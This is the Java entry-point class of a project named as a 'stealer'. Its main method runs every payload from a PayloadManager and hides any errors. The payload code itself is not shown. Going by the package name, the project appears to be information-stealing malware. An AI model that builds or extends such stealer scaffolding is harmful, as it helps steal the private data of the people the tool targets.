package dev.chaarlottte.stealer;

import dev.chaarlottte.stealer.payload.PayloadManager;

public class Main {

    public static void main(String[] args) {
        try { new PayloadManager().executePayloads(); } catch (Exception ignored) { ignored.printStackTrace(); }
    }

}